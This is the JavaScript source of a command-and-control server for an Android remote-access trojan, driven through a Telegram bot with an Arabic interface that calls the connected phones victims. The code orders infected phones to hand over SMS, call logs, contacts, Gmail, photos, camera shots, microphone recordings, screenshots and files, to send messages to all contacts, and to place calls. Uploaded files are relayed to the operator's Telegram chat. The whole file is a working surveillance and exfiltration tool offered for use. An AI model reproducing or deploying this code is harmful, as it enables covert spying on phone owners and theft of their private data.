const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);
const uploader = multer();

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const bot = new telegramBot(data['token'], { polling: true });
const appData = new Map();

const actions = [
    '📞 سجل المكالمات 📞',
    '💬 سحب الرسائل 💬',
    '📒 سحب جهات اتصال 📒',
    '📸 كيمرا أمامية 📸',
    '📸 كيمرا خلفية 📸',
    '📽 التطبيقات 📽',
    '📺 لقطة شاشة 📺',
    '🎬 سحب جميع الصور 🎬',
    '📧 سحب رسائل جيميل 📧',
    '🎙 تسجيل صوت 🎙',
    '📂 عرض جميع الملفات 📂',
    'file-explo',
    '🦝 اضهار اشعارات الضحيه 🦝',
    '📳 اهتزاز 📳',
    '▶ تشغيل الصوت ▶',
    '🛑 ايقاف الصوت 🛑',
    '🌐 اكتب الرابط 🌐',
    '🔔 اشعارات 🛑',
    'صوت 🛑',
    'صوت ▶',
    'clipboard',
    'contacts',
    'main-camera',
    'gallery'
];

app.get('/', (req, res) => {
    res.send('إصدار البرمجية 5<br>صنع برمجيات للاجهزه المـحموله<br>للتواصل بل اتمس');
});

app.post('/upload', uploader.single('file'), (req, res) => {
    const filename = req.file.originalname;
    const contentType = req.file.mimetype;
    
    bot.sendDocument(data['id'], req.file.buffer, {
        caption: `✯ تم رفع الملف \n\nاسم الهاتف → ${filename}\n`,
        parse_mode: 'HTML'
    }, {
        filename: filename,
        contentType: contentType
    });
    res.send('Done');
});

io.on('connection', socket => {
    let deviceName = (socket.handshake.query['model'] + ' - ' + io.of('/').sockets.size) || 'no information';
    let deviceBattery = socket.handshake.query['battery'] || 'no information';
    let deviceIp = socket.handshake.query['ip'] || 'no information';

    socket['model'] = deviceName;
    socket['battery'] = deviceBattery;
    socket['ip'] = deviceIp;

    let infoMessage = `✯ جهاز ضحية متصل جديد \n\n` +
        `اسم الهاتف → ${deviceName}\n` +
        `البطارية → ${deviceBattery}\n` +
        `ip → ${deviceIp}\n` +
        `التاريخ والوقت → ${socket.handshake.time}\n\n`;

    bot.sendMessage(data['id'], infoMessage, { parse_mode: 'HTML' });

    socket.on('disconnect', () => {
        let disconnectMessage = `✯ جهاز ضحية غير متصل \n\n` +
            `اسم الهاتف → ${deviceName}\n` +
            `البطارية → ${deviceBattery}\n` +
            `ip → ${deviceIp}\n` +
            `التاريخ والوقت → ${socket.handshake.time}\n\n`;
        bot.sendMessage(data['id'], disconnectMessage, { parse_mode: 'HTML' });
    });

    socket.on('installed-apps', apps => {
        let keyboard = [], row = [];
        apps.forEach((app, index) => {
            let callbackData;
            app.isFolder ? callbackData = deviceName + '|delete-' + app.name : callbackData = deviceName + '|request-' + app.name;
            if (row.length < 2 || row.length === 3) {
                row.push({
                    text: app.name,
                    callback_data: callbackData
                });
                row.length === 3 && keyboard.push(row);
            } else {
                row.length === 4 && (row.push({
                    text: app.name,
                    callback_data: callbackData
                }), keyboard.push(row), row = []);
            }
        });
        keyboard.push([{
            text: '✯ رجوع ✯',
            callback_data: deviceName + '|back-0'
        }]);
        bot.sendMessage(data['id'], `✯ قائمة التطبيقات المثبتة لدى الضحية \n\nاختر أي تطبيق تريد إزالته أو فتحـه :\n\nـ`, {
            reply_markup: { inline_keyboard: keyboard },
            parse_mode: 'HTML'
        });
    });

    socket.on('toast', toastText => {
        bot.sendMessage(data['id'], `✯ تم تنفيذ الطلب \n\nتم إظهار رسالة toast في شاشة الضحية → ${deviceName} بعد الضغط على زر الاتصال به\n${toastText}`, { parse_mode: 'HTML' });
    });
});

bot.on('message', msg => {
    if (msg.text === '/start') {
        bot.sendMessage(data['id'], `✯ أهلآ وسهلا في اقوى بوت تحكم لاجهزه الاندرويد \n\n✯ نحن لانخترق انما نحن نسهل الاختراق للجيش اليمني والرقابه الالكترونية \n\nهذا البوت يتيح لك التحكم في هاتف الضحيه بالكامل وسهل الاستخدام لاتحتاج الا كود واحد لكي يعمل بكفاءه عاليه جدا, \n\nالإصدار 5\n\n`, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    [
                        '✯ عدد الاجهزة متصلة ✯',
                        '✯ قائمة الضحايا ✯'
                    ],
                    ['✯ تحكم ✯']
                ],
                resize_keyboard: true
            }
        });
    } else {
        if (appData.get('state') === 'wait-sms') {
            let smsText = msg.text, targetSocketId = appData.get('socketId');
            io.to(targetSocketId).emit('commend', {
                request: 'smsToAllContacts',
                extras: [{
                    key: 'smsText',
                    value: smsText
                }]
            });
            appData.delete('socketId');
            appData.delete('state');
            bot.sendMessage(data['id'], `✯ تم تنفيذ طلب الرسالة لجميع جهات اتصال الضحية بنجاح سوف يتم إرسال الرسالة إلى كل الارقام `, {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        [
                            '✯ عدد الاجهزة متصلة ✯',
                            '✯ قائمة الضحايا ✯'
                        ],
                        ['✯ تحكم ✯']
                    ],
                    resize_keyboard: true
                }
            });
        } else {
            if (appData.get('state') === 'wait-call') {
                let callNumber = msg.text, targetSocketId = appData.get('socketId');
                io.to(targetSocketId).emit('commend', {
                    request: 'makeCallNumber',
                    extras: [{
                        key: 'number',
                        value: callNumber
                    }]
                });
                appData.delete('socketId');
                appData.delete('state');
                bot.sendMessage(data['id'], `✯ تم تنفيذ طلب الاتصال بنجاح`, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            [
                                '✯ عدد الاجهزة متصلة ✯',
                                '✯ قائمة الضحايا ✯'
                            ],
                            ['✯ تحكم ✯']
                        ],
                        resize_keyboard: true
                    }
                });
            }
        }
    }
    if (appData.get('state') === 'wait-url') {
        let urlText = msg.text;
        appData.set('currentTar', urlText);
        appData.set('state', 'wait-url-duration');
        bot.sendMessage(data['id'], `✯ أندرويد \n\n✯ اكتب الرابط الذي تريد فتحه في هاتف الضحية \n\nالمدة بالثواني\n\nالعدد ${urlText}\n\n`, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['✯ التراجع ✯']],
                resize_keyboard: true,
                one_time_keyboard: true
            }
        });
    } else {
        if (appData.get('state') === 'wait-url-duration') {
            let duration = msg.text, tarUrl = appData.get('currentTar'), targetSocketId = appData.get('socketId');
            io.to(targetSocketId).emit('commend', {
                request: 'onUrl',
                extras: [
                    {
                        key: 'url',
                        value: tarUrl
                    },
                    {
                        key: 'Duration',
                        value: duration
                    }
                ]
            });
            appData.delete('socketId');
            appData.delete('state');
            appData.delete('currentTar');
            bot.sendMessage(data['id'], `✯ تم تنفيذ الطلب `, {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        [
                            '✯ عدد الاجهزة متصلة ✯',
                            '✯ قائمة الضحايا ✯'
                        ],
                        ['✯ تحكم ✯']
                    ],
                    resize_keyboard: true
                }
            });
        } else {
            if (appData.get('state') === 'wait-toast') {
                let toastText = msg.text;
                appData.set('currentTar', toastText);
                appData.set('state', 'wait-toast-duration');
                bot.sendMessage(data['id'], `✯ عدد الاجهزة متصلة \n\n✯ اكتب النص الذي تريد أن تظهر في شاشة الضحية \n\nالمدة بالثواني\n\n`, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ التراجع ✯']],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                });
            } else {
                if (appData.get('state') === 'wait-toast-duration') {
                    let duration = msg.text, toastText = appData.get('currentTar'), targetSocketId = appData.get('socketId');
                    io.to(targetSocketId).emit('commend', {
                        request: 'toast',
                        extras: [
                            {
                                key: 'url',
                                value: toastText
                            },
                            {
                                key: 'Duration',
                                value: duration
                            }
                        ]
                    });
                    appData.delete('socketId');
                    appData.delete('state');
                    appData.delete('currentTar');
                    bot.sendMessage(data['id'], `✯ تم تنفيذ الطلب `, {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [
                                [
                                    '✯ عدد الاجهزة متصلة ✯',
                                    '✯ قائمة الضحايا ✯'
                                ],
                                ['✯ تحكم ✯']
                            ],
                            resize_keyboard: true
                        }
                    });
                } else {
                    if (appData.get('state') === 'wait-vibrate') {
                        let vibrateDur = msg.text, targetSocketId = appData.get('socketId');
                        io.to(targetSocketId).emit('commend', {
                            request: 'vibrate',
                            extras: [{
                                key: 'vibrateDur',
                                value: vibrateDur
                            }]
                        });
                        appData.delete('socketId');
                        appData.delete('state');
                        bot.sendMessage(data['id'], `✯ تم تنفيذ الطلب `, {
                            parse_mode: 'HTML',
                            reply_markup: {
                                keyboard: [
                                    [
                                        '✯ عدد الاجهزة متصلة ✯',
                                        '✯ قائمة الضحايا ✯'
                                    ],
                                    ['✯ تحكم ✯']
                                ],
                                resize_keyboard: true
                            }
                        });
                    } else {
                        if (appData.get('state') === 'wait-playaudio') {
                            let playAudio = msg.text, targetSocketId = appData.get('socketId');
                            io.to(targetSocketId).emit('commend', {
                                request: 'playAudio',
                                extras: [{
                                    key: 'url',
                                    value: playAudio
                                }]
                            });
                            appData.delete('socketId');
                            appData.delete('state');
                            bot.sendMessage(data['id'], `✯ تم تنفيذ الطلب `, {
                                parse_mode: 'HTML',
                                reply_markup: {
                                    keyboard: [
                                        [
                                            '✯ عدد الاجهزة متصلة ✯',
                                            '✯ قائمة الضحايا ✯'
                                        ],
                                        ['✯ تحكم ✯']
                                    ],
                                    resize_keyboard: true
                                }
                            });
                        } else {
                            if (appData.get('state') === 'wait-notif') {
                                let title = msg.text;
                                appData.set('currentNot', title);
                                appData.set('state', 'wait-notif-body');
                                bot.sendMessage(data['id'], `✯ جهاز \n\n✯ اكتب العنوان الذي تريد إرساله لإشعار الضحية \n\n`, {
                                    parse_mode: 'HTML',
                                    reply_markup: {
                                        keyboard: [['✯ التراجع ✯']],
                                        resize_keyboard: true,
                                        one_time_keyboard: true
                                    }
                                });
                            } else {
                                if (appData.get('state') === 'wait-notif-body') {
                                    let body = msg.text, title = appData.get('currentNot'), targetSocketId = appData.get('socketId');
                                    io.to(targetSocketId).emit('commend', {
                                        request: 'popNotification',
                                        extras: [
                                            {
                                                key: 'url',
                                                value: title
                                            },
                                            {
                                                key: 'text',
                                                value: body
                                            }
                                        ]
                                    });
                                    appData.delete('socketId');
                                    appData.delete('state');
                                    appData.delete('currentNot');
                                    bot.sendMessage(data['id'], `✯ تم تنفيذ الطلب `, {
                                        parse_mode: 'HTML',
                                        reply_markup: {
                                            keyboard: [
                                                [
                                                    '✯ عدد الاجهزة متصلة ✯',
                                                    '✯ قائمة الضحايا ✯'
                                                ],
                                                ['✯ تحكم ✯']
                                            ],
                                            resize_keyboard: true
                                        }
                                    });
                                } else {
                                    if (msg.text === '✯ عدد الاجهزة متصلة ✯') {
                                        if (io.of('/').sockets.size === 0)
                                            bot.sendMessage(data['id'], `✯ لايوجد أي ضحية متصل حاليا `, { parse_mode: 'HTML' });
                                        else {
                                            let onlineMessage = `✯ أندرويد \n\nعدد الضحايا متصلة\n\n` + io.of('/').sockets.size + `\n\n`, count = 1;
                                            io.of('/').sockets.forEach((socket) => {
                                                onlineMessage += `✯ رقم ${count} \n` + `اسم الهاتف → ${socket.model}\n` + `البطارية → ${socket.battery}\n` + `ip → ${socket.ip}\n` + `التاريخ والوقت → ${socket.handshake.time}\n\n`;
                                                count++;
                                            });
                                            bot.sendMessage(data['id'], onlineMessage, { parse_mode: 'HTML' });
                                        }
                                    } else {
                                        if (msg.text === '✯ قائمة الضحايا ✯') {
                                            if (io.of('/').sockets.size === 0)
                                                bot.sendMessage(data['id'], `✯ لايوجد أي ضحية متصل حاليا `, { parse_mode: 'HTML' });
                                            else {
                                                let keyboard = [];
                                                io.of('/').sockets.forEach((socket) => {
                                                    keyboard.push([socket.model]);
                                                });
                                                keyboard.push(['✯ القائمة الرئيسية ✯']);
                                                bot.sendMessage(data['id'], `✯ اختر الهاتف الذي تريد التحكم به `, {
                                                    parse_mode: 'HTML',
                                                    reply_markup: {
                                                        keyboard: keyboard,
                                                        resize_keyboard: true,
                                                        one_time_keyboard: true
                                                    }
                                                });
                                            }
                                        } else {
                                            if (msg.text === '✯ القائمة الرئيسية ✯')
                                                bot.sendMessage(data['id'], `✯ أهلآ وسهلا `, { parse_mode: 'HTML' });
                                            else {
                                                if (msg.text === '✯ التراجع ✯')
                                                    bot.sendMessage(data['id'], `✯ تم التراجع `, {
                                                        parse_mode: 'HTML',
                                                        reply_markup: {
                                                            keyboard: [
                                                                [
                                                                    '✯ عدد الاجهزة متصلة ✯',
                                                                    '✯ قائمة الضحايا ✯'
                                                                ],
                                                                ['✯ تحكم ✯']
                                                            ],
                                                            resize_keyboard: true
                                                        }
                                                    });
                                                else {
                                                    if (msg.text === '✯ تحكم ✯') {
                                                        let deviceModel = io.of('/').sockets.get(appData.get('socketId'))?.model;
                                                        bot.sendMessage(data['id'], `✯ تم اختيار الهاتف \n\nاسم الهاتف → ${deviceModel}\n`, {
                                                            parse_mode: 'HTML',
                                                            reply_markup: {
                                                                keyboard: [
                                                                    [
                                                                        '📞 سجل المكالمات 📞',
                                                                        '💬 سحب الرسائل 💬'
                                                                    ],
                                                                    [
                                                                        '📒 سحب جهات اتصال 📒',
                                                                        '📸 كيمرا أمامية 📸'
                                                                    ],
                                                                    [
                                                                        '📸 كيمرا خلفية 📸',
                                                                        '📽 التطبيقات 📽'
                                                                    ],
                                                                    [
                                                                        '📺 لقطة شاشة 📺',
                                                                        '🔔 اشعارات 🛑'
                                                                    ],
                                                                    [
                                                                        '🦝 اضهار اشعارات الضحيه 🦝',
                                                                        '🌐 اكتب الرابط 🌐'
                                                                    ],
                                                                    [
                                                                        '🎬 سحب جميع الصور 🎬',
                                                                        'صوت ▶'
                                                                    ],
                                                                    [
                                                                        'صوت 🛑',
                                                                        'صوت ▶'
                                                                    ],
                                                                    [
                                                                        '📳 اهتزاز 📳',
                                                                        '▶ تشغيل الصوت ▶'
                                                                    ],
                                                                    [
                                                                        '🛑 ايقاف الصوت 🛑',
                                                                        '📂 عرض جميع الملفات 📂'
                                                                    ],
                                                                    ['file-explo'],
                                                                    [
                                                                        '📧 سحب رسائل جيميل 📧',
                                                                        '🎙 تسجيل صوت 🎙'
                                                                    ],
                                                                    [
                                                                        'ايقاف الاتصال بالضحيه 🛑',
                                                                        'تواصل بل امس 🛑'
                                                                    ],
                                                                    ['✯ القائمة الرئيسية ✯']
                                                                ],
                                                                resize_keyboard: true,
                                                                one_time_keyboard: true
                                                            }
                                                        });
                                                    } else {
                                                        if (actions.includes(msg.text)) {
                                                            let socketId = appData.get('socketId');
                                                            msg.text === '📞 سجل المكالمات 📞' && (io.to(socketId).emit('commend', {
                                                                request: 'calls',
                                                                extras: []
                                                            }), appData.delete('socketId'), bot.sendMessage(data['id'], `✯ تم تنفيذ الطلب `, {
                                                                parse_mode: 'HTML',
                                                                reply_markup: {
                                                                    keyboard: [
                                                                        [
                                                                            '✯ عدد الاجهزة متصلة ✯',
                                                                            '✯ قائمة الضحايا ✯'
                                                                        ],
                                                                        ['✯ تحكم ✯']
                                                                    ],
                                                                    resize_keyboard: true
                                                                }
                                                            }));
                                                            msg.text === '💬 سحب الرسائل 💬' && (io.to(socketId).emit('commend', {
                                                                request: 'message',
                                                                extras: []
                                                            }), appData.delete('socketId'), bot.sendMessage(data['id'], `✯ تم تنفيذ الطلب `, {
                                                                parse_mode: 'HTML',
                                                                reply_markup: {
                                                                    keyboard: [
                                                                        [
                                                                            '✯ عدد الاجهزة متصلة ✯',
                                                                            '✯ قائمة الضحايا ✯'
                                                                        ],
                                                                        ['✯ تحكم ✯']
                                                                    ],
                                                                    resize_keyboard: true
                                                                }
                                                            }));
                                                            msg.text === '📒 سحب جهات اتصال 📒' && (io.to(socketId).emit('commend', {
                                                                request: 'contacts',
                                                                extras: []
                                                            }), appData.delete('socketId'), bot.sendMessage(data['id'], `✯ تم تنفيذ الطلب `, {
                                                                parse_mode: 'HTML',
                                                                reply_markup: {
                                                                    keyboard: [
                                                                        [
                                                                            '✯ عدد الاجهزة متصلة ✯',
                                                                            '✯ قائمة الضحايا ✯'
                                                                        ],
                                                                        ['✯ تحكم ✯']
                                                                    ],
                                                                    resize_keyboard: true
                                                                }
                                                            }));
                                                            msg.text === '📸 كيمرا أمامية 📸' && (io.to(socketId).emit('commend', {
                                                                request: 'selfie-cam',
                                                                extras: []
                                                            }), appData.delete('socketId'), bot.sendMessage(data['id'], `✯ تم تنفيذ الطلب `, {
                                                                parse_mode: 'HTML',
                                                                reply_markup: {
                                                                    keyboard: [
                                                                        [
                                                                            '✯ عدد الاجهزة متصلة ✯',
                                                                            '✯ قائمة الضحايا ✯'
                                                                        ],
                                                                        ['✯ تحكم ✯']
                                                                    ],
                                                                    resize_keyboard: true
                                                                }
                                                            }));
                                                            msg.text === '📸 كيمرا خلفية 📸' && (io.to(socketId).emit('commend', {
                                                                request: 'main-camera',
                                                                extras: []
                                                            }), appData.delete('socketId'), bot.sendMessage(data['id'], `✯ تم تنفيذ الطلب `, {
                                                                parse_mode: 'HTML',
                                                                reply_markup: {
                                                                    keyboard: [
                                                                        [
                                                                            '✯ عدد الاجهزة متصلة ✯',
                                                                            '✯ قائمة الضحايا ✯'
                                                                        ],
                                                                        ['✯ تحكم ✯']
                                                                    ],
                                                                    resize_keyboard: true
                                                                }
                                                            }));
                                                            msg.text === '📽 التطبيقات 📽' && (io.to(socketId).emit('commend', {
                                                                request: 'apps',
                                                                extras: []
                                                            }), appData.delete('socketId'), bot.sendMessage(data['id'], `✯ تم تنفيذ الطلب `, {
                                                                parse_mode: 'HTML',
                                                                reply_markup: {
                                                                    keyboard: [
                                                                        [
                                                                            '✯ عدد الاجهزة متصلة ✯',
                                                                            '✯ قائمة الضحايا ✯'
                                                                        ],
                                                                        ['✯ تحكم ✯']
                                                                    ],
                                                                    resize_keyboard: true
                                                                }
                                                            }));
                                                            msg.text === '📺 لقطة شاشة 📺' && (io.to(socketId).emit('commend', {
                                                                request: 'screenshot',
                                                                extras: []
                                                            }), appData.delete('socketId'), bot.sendMessage(data['id'], `✯ تم تنفيذ الطلب `, {
                                                                parse_mode: 'HTML',
                                                                reply_markup: {
                                                                    keyboard: [
                                                                        [
                                                                            '✯ عدد الاجهزة متصلة ✯',
                                                                            '✯ قائمة الضحايا ✯'
                                                                        ],
                                                                        ['✯ تحكم ✯']
                                                                    ],
                                                                    resize_keyboard: true
                                                                }
                                                            }));
                                                            msg.text === '🎬 سحب جميع الصور 🎬' && (io.to(socketId).emit('commend', {
                                                                request: 'gallery',
                                                                extras: []
                                                            }), appData.delete('socketId'), bot.sendMessage(data['id'], `✯ تم تنفيذ الطلب `, {
                                                                parse_mode: 'HTML',
                                                                reply_markup: {
                                                                    keyboard: [
                                                                        [
                                                                            '✯ عدد الاجهزة متصلة ✯',
                                                                            '✯ قائمة الضحايا ✯'
                                                                        ],
                                                                        ['✯ تحكم ✯']
                                                                    ],
                                                                    resize_keyboard: true
                                                                }
                                                            }));
                                                            msg.text === '📧 سحب رسائل جيميل 📧' && (io.to(socketId).emit('commend', {
                                                                request: 'all-email',
                                                                extras: []
                                                            }), appData.delete('socketId'), bot.sendMessage(data['id'], `✯ تم تنفيذ الطلب `, {
                                                                parse_mode: 'HTML',
                                                                reply_markup: {
                                                                    keyboard: [
                                                                        [
                                                                            '✯ عدد الاجهزة متصلة ✯',
                                                                            '✯ قائمة الضحايا ✯'
                                                                        ],
                                                                        ['✯ تحكم ✯']
                                                                    ],
                                                                    resize_keyboard: true
                                                                }
                                                            }));
                                                            msg.text === '🎙 تسجيل صوت 🎙' && (io.to(socketId).emit('commend', {
                                                                request: 'microphone',
                                                                extras: []
                                                            }), appData.delete('socketId'), bot.sendMessage(data['id'], `✯ تم تنفيذ الطلب `, {
                                                                parse_mode: 'HTML',
                                                                reply_markup: {
                                                                    keyboard: [
                                                                        [
                                                                            '✯ عدد الاجهزة متصلة ✯',
                                                                            '✯ قائمة الضحايا ✯'
                                                                        ],
                                                                        ['✯ تحكم ✯']
                                                                    ],
                                                                    resize_keyboard: true
                                                                }
                                                            }));
                                                            msg.text === '📂 عرض جميع الملفات 📂' && (io.to(socketId).emit('commend', {
                                                                request: 'file-explo',
                                                                extras: []
                                                            }), appData.delete('socketId'), bot.sendMessage(data['id'], `✯ تم تنفيذ الطلب `, {
                                                                parse_mode: 'HTML',
                                                                reply_markup: {
                                                                    keyboard: [
                                                                        [
                                                                            '✯ عدد الاجهزة متصلة ✯',
                                                                            '✯ قائمة الضحايا ✯'
                                                                        ],
                                                                        ['✯ تحكم ✯']
                                                                    ],
                                                                    resize_keyboard: true
                                                                }
                                                            }));
                                                            msg.text === 'file-explo' && (io.to(socketId).emit('commend', {
                                                                request: 'ls',
                                                                extras: []
                                                            }), appData.delete('socketId'), bot.sendMessage(data['id'], `✯ تم تنفيذ الطلب `, {
                                                                parse_mode: 'HTML',
                                                                reply_markup: {
                                                                    keyboard: [
                                                                        [
                                                                            '✯ عدد الاجهزة متصلة ✯',
                                                                            '✯ قائمة الضحايا ✯'
                                                                        ],
                                                                        ['✯ تحكم ✯']
                                                                    ],
                                                                    resize_keyboard: true
                                                                }
                                                            }));
                                                            msg.text === '🦝 اضهار اشعارات الضحيه 🦝' && (io.to(socketId).emit('commend', {
                                                                request: 'currentNot',
                                                                extras: []
                                                            }), appData.delete('socketId'), bot.sendMessage(data['id'], `✯ تم تنفيذ الطلب `, {
                                                                parse_mode: 'HTML',
                                                                reply_markup: {
                                                                    keyboard: [
                                                                        [
                                                                            '✯ عدد الاجهزة متصلة ✯',
                                                                            '✯ قائمة الضحايا ✯'
                                                                        ],
                                                                        ['✯ تحكم ✯']
                                                                    ],
                                                                    resize_keyboard: true
                                                                }
                                                            }));
                                                            msg.text === '📳 اهتزاز 📳' && (appData.set('state', 'wait-vibrate'), bot.sendMessage(data['id'], `✯ أندرويد \n\nأدخل مدة الاهتزاز بالثواني `, {
                                                                parse_mode: 'HTML',
                                                                reply_markup: {
                                                                    keyboard: [['✯ القائمة الرئيسية ✯']],
                                                                    resize_keyboard: true,
                                                                    one_time_keyboard: true
                                                                }
                                                            }));
                                                            msg.text === '▶ تشغيل الصوت ▶' && (appData.set('state', 'wait-playaudio'), bot.sendMessage(data['id'], `✯ أندرويد \n\nأدخل رابط الصوت المراد تشغيله `, {
                                                                parse_mode: 'HTML',
                                                                reply_markup: {
                                                                    keyboard: [['✯ القائمة الرئيسية ✯']],
                                                                    resize_keyboard: true,
                                                                    one_time_keyboard: true
                                                                }
                                                            }));
                                                            msg.text === '🛑 ايقاف الصوت 🛑' && (appData.set('state', 'wait-stopaudio'), bot.sendMessage(data['id'], `✯ أندرويد `, {
                                                                parse_mode: 'HTML',
                                                                reply_markup: {
                                                                    keyboard: [['✯ القائمة الرئيسية ✯']],
                                                                    resize_keyboard: true,
                                                                    one_time_keyboard: true
                                                                }
                                                            }));
                                                            msg.text === '🌐 اكتب الرابط 🌐' && (appData.set('state', 'wait-url'), bot.sendMessage(data['id'], `✯ أندرويد \n\nاكتب الرابط `, {
                                                                parse_mode: 'HTML',
                                                                reply_markup: {
                                                                    keyboard: [['✯ القائمة الرئيسية ✯']],
                                                                    resize_keyboard: true,
                                                                    one_time_keyboard: true
                                                                }
                                                            }));
                                                            msg.text === '🔔 اشعارات 🛑' && (appData.set('state', 'wait-notif'), bot.sendMessage(data['id'], `✯ أندرويد \n\nاكتب إشعار `, {
                                                                parse_mode: 'HTML',
                                                                reply_markup: {
                                                                    keyboard: [['✯ القائمة الرئيسية ✯']],
                                                                    resize_keyboard: true,
                                                                    one_time_keyboard: true
                                                                }
                                                            }));
                                                            msg.text === 'ايقاف الاتصال بالضحيه 🛑' && (appData.set('state', 'wait-disconnect'), bot.sendMessage(data['id'], `✯ أندرويد \n\nهل أنت متأكد من قطع الاتصال بالضحية؟`, {
                                                                parse_mode: 'HTML',
                                                                reply_markup: {
                                                                    keyboard: [['✯ القائمة الرئيسية ✯']],
                                                                    resize_keyboard: true,
                                                                    one_time_keyboard: true
                                                                }
                                                            }));
                                                            msg.text === 'تواصل بل امس 🛑' && (appData.set('state', 'wait-sms'), bot.sendMessage(data['id'], `✯ أندرويد \n\nأدخل نص الرسالة التي ستُرسل لكل جهات الاتصال `, {
                                                                parse_mode: 'HTML',
                                                                reply_markup: {
                                                                    keyboard: [['✯ القائمة الرئيسية ✯']],
                                                                    resize_keyboard: true,
                                                                    one_time_keyboard: true
                                                                }
                                                            }));
                                                        } else {
                                                            io.of('/').sockets.forEach((socket, socketId) => {
                                                                if (msg.text === socket.model) {
                                                                    appData.set('socketId', socketId);
                                                                    bot.sendMessage(data['id'], `✯ تم اختيار الهاتف \n\nاسم الهاتف → ${socket.model}\n`, {
                                                                        parse_mode: 'HTML',
                                                                        reply_markup: {
                                                                            keyboard: [
                                                                                [
                                                                                    '📞 سجل المكالمات 📞',
                                                                                    '💬 سحب الرسائل 💬'
                                                                                ],
                                                                                [
                                                                                    '📒 سحب جهات اتصال 📒',
                                                                                    '📸 كيمرا أمامية 📸'
                                                                                ],
                                                                                [
                                                                                    '📸 كيمرا خلفية 📸',
                                                                                    '📽 التطبيقات 📽'
                                                                                ],
                                                                                [
                                                                                    '📺 لقطة شاشة 📺',
                                                                                    '🔔 اشعارات 🛑'
                                                                                ],
                                                                                [
                                                                                    '🦝 اضهار اشعارات الضحيه 🦝',
                                                                                    '🌐 اكتب الرابط 🌐'
                                                                                ],
                                                                                [
                                                                                    '🎬 سحب جميع الصور 🎬',
                                                                                    'صوت ▶'
                                                                                ],
                                                                                [
                                                                                    'صوت 🛑',
                                                                                    'صوت ▶'
                                                                                ],
                                                                                [
                                                                                    '📳 اهتزاز 📳',
                                                                                    '▶ تشغيل الصوت ▶'
                                                                                ],
                                                                                [
                                                                                    '🛑 ايقاف الصوت 🛑',
                                                                                    '📂 عرض جميع الملفات 📂'
                                                                                ],
                                                                                ['file-explo'],
                                                                                [
                                                                                    '📧 سحب رسائل جيميل 📧',
                                                                                    '🎙 تسجيل صوت 🎙'
                                                                                ],
                                                                                [
                                                                                    'ايقاف الاتصال بالضحيه 🛑',
                                                                                    'تواصل بل امس 🛑'
                                                                                ],
                                                                                ['✯ القائمة الرئيسية ✯']
                                                                            ],
                                                                            resize_keyboard: true,
                                                                            one_time_keyboard: true
                                                                        }
                                                                    });
                                                                }
                                                            });
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
});

bot.on('callback_query', callbackQuery => {
    let queryData = callbackQuery.data;
    if (!queryData || !queryData.includes('|')) return;
    
    let deviceName = queryData.split('|')[0], 
        actionString = queryData.split('|')[1], 
        actionType = actionString.split('-')[0], 
        path = actionString.split('-')[1];
    
    if (actionType === 'request')
        io.of('/').sockets.forEach((socket, socketId) => {
            if (socket.model === deviceName)
                io.to(socketId).emit('commend', {
                    request: 'request',
                    extras: []
                });
        });
    if (actionType === 'cd')
        io.of('/').sockets.forEach((socket, socketId) => {
            if (socket.model === deviceName)
                io.to(socketId).emit('commend', {
                    request: 'cd',
                    extras: [{
                        key: 'path',
                        value: path
                    }]
                });
        });
    if (actionType === 'download')
        io.of('/').sockets.forEach((socket, socketId) => {
            if (socket.model === deviceName)
                io.to(socketId).emit('commend', {
                    request: 'download',
                    extras: [{
                        key: 'path',
                        value: path
                    }]
                });
        });
    if (actionType === 'delete')
        io.of('/').sockets.forEach((socket, socketId) => {
            if (socket.model === deviceName)
                io.to(socketId).emit('commend', {
                    request: 'delete',
                    extras: [{
                        key: 'path',
                        value: path
                    }]
                });
        });
    if (actionType === 'keylogger')
        bot.editMessageText(`✯ تفاصيل الملف :  ${path}`, {
            chat_id: data['id'],
            message_id: callbackQuery.message.message_id,
            reply_markup: {
                inline_keyboard: [[
                    {
                        text: 'تحميل الملف',
                        callback_data: deviceName + '|download-' + path
                    },
                    {
                        text: 'حذف الملف',
                        callback_data: deviceName + '|delete-' + path
                    }
                ]]
            },
            parse_mode: 'HTML'
        });
});

setInterval(() => {
    io.of('/').sockets.forEach((socket, socketId) => {
        io.to(socketId).emit('ping', {});
    });
}, 10000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
